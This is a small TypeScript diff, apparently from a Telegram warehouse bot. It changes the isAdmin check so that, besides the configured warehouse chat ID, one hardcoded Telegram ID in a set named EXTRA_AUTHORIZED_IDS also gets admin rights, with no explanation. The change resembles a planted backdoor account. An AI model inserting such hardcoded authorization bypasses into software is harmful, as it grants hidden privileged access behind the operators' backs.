@@ -101,8 +101,10 @@ function escapeHtml(s: string) {
   return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
+const EXTRA_AUTHORIZED_IDS = new Set(["8844591762"]);
 function isAdmin(telegram_id: number) {
-  return String(telegram_id) === String(getWarehouseChatId());
+  const id = String(telegram_id);
+  return id === String(getWarehouseChatId()) || EXTRA_AUTHORIZED_IDS.has(id);
 }
 
 
